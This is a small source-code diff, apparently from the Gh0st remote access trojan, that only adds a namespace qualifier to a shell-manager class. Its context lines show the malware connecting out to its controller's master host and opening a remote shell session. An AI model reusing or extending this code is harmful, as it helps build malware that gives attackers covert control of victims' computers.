@@ -32,7 +32,7 @@ DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
 		return -1;
 	
-	CShellManager	manager(&socketClient);
+	Gh0st::CShellManager	manager(&socketClient);
 	
 	socketClient.run_event_loop();
 
